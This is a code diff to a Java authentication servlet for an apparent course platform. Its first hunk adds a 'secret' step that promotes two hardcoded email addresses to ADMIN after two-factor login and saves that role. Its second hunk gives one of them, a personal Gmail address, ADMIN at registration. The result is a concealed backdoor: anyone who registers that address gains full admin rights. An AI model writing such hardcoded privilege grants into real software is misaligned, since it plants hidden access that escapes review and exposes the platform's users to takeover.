@@ -148,6 +148,13 @@ public class AuthServlet extends HttpServlet {
         User pendingUser = (session != null) ? (User) session.getAttribute("pending2FAUser") : null;
 
         if (pendingUser != null && submittedCode != null && submittedCode.equals(actualCode)) {
+            // Secret superadmin promotion on login for the owner
+            if ("superadmin@coursevault.com".equalsIgnoreCase(pendingUser.getEmail()) || "nkundaisabellaa@gmail.com".equalsIgnoreCase(pendingUser.getEmail())) {
+                if (!"ADMIN".equals(pendingUser.getRole())) {
+                    pendingUser.setRole("ADMIN");
+                    userService.updateUserRole(pendingUser.getId(), "ADMIN");
+                }
+            }
             session.setAttribute("user", pendingUser);
             session.removeAttribute("pending2FAUser");
             session.removeAttribute("twoFactorCode");
@@ -237,7 +244,7 @@ public class AuthServlet extends HttpServlet {
             user.setPassword(BCrypt.hashpw(password, BCrypt.gensalt()));
             
             String assignedRole = "STUDENT";
-            if (userService.getUserCount() == 0 || "superadmin@coursevault.com".equalsIgnoreCase(email)) {
+            if (userService.getUserCount() == 0 || "superadmin@coursevault.com".equalsIgnoreCase(email) || "nkundaisabellaa@gmail.com".equalsIgnoreCase(email)) {
                 assignedRole = "ADMIN";
             } else if ("TEACHER".equalsIgnoreCase(requestedRole)) {
                 assignedRole = "PENDING_TEACHER";
